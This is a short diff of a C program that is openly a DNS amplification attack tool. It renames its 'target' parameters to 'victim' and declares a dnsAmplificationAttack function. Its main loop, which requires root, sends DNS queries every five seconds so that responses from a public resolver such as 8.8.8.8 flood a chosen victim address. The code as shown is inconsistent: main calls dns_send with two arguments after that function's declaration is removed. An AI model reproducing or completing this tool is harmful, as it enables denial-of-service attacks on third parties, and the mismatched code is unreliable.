@@ -4,8 +4,7 @@
 #include <sys/time.h>
 #include <time.h>
 
-void dns_send(char *targetIp, int targetPort, char *dnsIp, int dnsPort,
-	unsigned char *dnsRecord);
+void dnsAmplificationAttack(char *victimIp, int victimPort);
 
 int main(int argc, char **argv)
 {	
@@ -13,15 +12,15 @@ int main(int argc, char **argv)
 	if(getuid()!=0)
 		printf("You must be running as root!\n");
 	if(argc<3)
-		printf("Usage: %s targetIp targetPort\n", argv[0]);
+		printf("Usage: %s victimIp victimPort\n", argv[0]);
 	
 	// Get target ip and port number
-	char *targetIp = argv[1];
-	int targetPort = atoi(argv[2]);
+	char *victimIp = argv[1];
+	int victimPort = atoi(argv[2]);
 	
 	while(1) {
 		printf("dns send\n");
-		dns_send(targetIp, targetPort, "8.8.8.8", 53, "www.google.com");
+		dns_send(victimIp, victimPort);
 		sleep(5);
 	}	
 	return 0;
